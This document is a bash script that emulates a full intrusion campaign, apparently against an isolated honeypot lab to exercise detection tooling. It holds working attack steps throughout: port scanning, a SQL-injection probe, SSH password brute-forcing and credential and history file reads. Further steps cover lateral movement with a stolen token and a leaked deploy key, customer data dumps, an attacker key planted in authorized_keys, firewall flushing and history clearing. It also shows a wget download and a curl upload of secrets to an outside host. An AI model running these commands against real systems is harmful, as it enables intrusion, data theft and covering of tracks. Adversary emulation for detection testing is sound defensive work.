#!/usr/bin/env bash
# Execute only in the isolated Mirage lab; lab mode must be ON.
set -euo pipefail
WEB=10.66.0.10 DB=10.66.0.20 FS=10.66.0.30
OUT=/tmp/mirage-campaign
mkdir -p "$OUT"
SSH=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=5)
echo '### recon'
# -sV over the mix of open/filtered ports is slow; 120s was too tight and skipped db/fs.
nmap -n -sS -sV --version-intensity 2 -Pn -T4 --max-retries 1 --host-timeout 300s -p 21,22,80,135,443,445,1433,3306,3389,5900,6379 "$WEB" "$DB" "$FS"
echo '### web probes'
curl -fsS -A gobuster/training "http://$WEB/.env" > "$OUT/web.env"
curl -sS -A sqlmap/training "http://$WEB/api/customers?id=1%20union%20select%201" >/dev/null
curl -sS -A nikto/training "http://$WEB/admin" >/dev/null
# TLS handshake so Suricata records a JA3 fingerprint
curl -ksS -A sqlmap/training "https://$WEB/" >/dev/null || true
for p in bad1 bad2 bad3 bad4 bad5; do
  sshpass -p "$p" ssh "${SSH[@]}" root@"$WEB" true 2>/dev/null || true
done
echo '### discovery and token read'
sshpass -p 123456 ssh "${SSH[@]}" root@"$WEB" 'hostname; uname -a; id; ls /var/www; ps aux; cat /var/www/.env; cat /root/.bash_history' > "$OUT/discovery.txt"
TOKEN=$(sed -n 's/^# backup password: //p' "$OUT/discovery.txt" | head -1 | tr -d '\r')
test "${#TOKEN}" -ge 24
echo '### token-based lateral SSH'
sshpass -p "$TOKEN" ssh "${SSH[@]}" backup@"$DB" 'hostname; ls; cat customers.csv; cat README.txt'
if sshpass -p incorrect ssh "${SSH[@]}" backup@"$DB" true 2>/dev/null; then
  echo 'FAIL: arbitrary password accepted by db-prod01'; exit 1
fi
echo '### leaked Git history and deploy key'
# git refuses to clone over an existing directory; reuse the same local training repository.
if [ ! -d "$OUT/repo/.git" ]; then git clone -q "http://$WEB/.git" "$OUT/repo"; fi
git -C "$OUT/repo" show HEAD~1:deploy_key > "$OUT/deploy_key"
chmod 600 "$OUT/deploy_key"
# deploy's home is recreated empty on login (new Cowrie user); read the shared backup dir.
ssh "${SSH[@]}" -o IdentitiesOnly=yes -i "$OUT/deploy_key" deploy@"$DB" 'hostname; cat /var/backups/customers.csv'
echo '### deeper discovery, persistence, defense evasion'
# One session exercising a broad set of post-exploitation techniques. Ends with `true`
# so a "command not found" inside Cowrie does not trip set -e.
sshpass -p 123456 ssh "${SSH[@]}" root@"$WEB" '
  whoami; groups; last
  ip addr show; ip route; cat /etc/resolv.conf
  netstat -tlnp; ss -tlnp
  getent passwd; cat /etc/passwd
  crontab -l; cat /etc/crontab
  cat /var/www/html/config.php
  echo "ssh-ed25519 AAAAattacker mirage" >> /root/.ssh/authorized_keys
  sudo -n id
  iptables -F
  history -c; true' || true
echo '### attempted transfer / exfiltration (emulated)'
sshpass -p 123456 ssh "${SSH[@]}" root@"$WEB" 'wget http://10.66.0.50/training.txt; curl -T /var/www/.env http://10.66.0.50/upload' || true
echo '### SMB discovery'
smbclient -L "//$FS" -N 2>&1 || true
echo 'Campaign complete. No downloaded payloads are executed.'
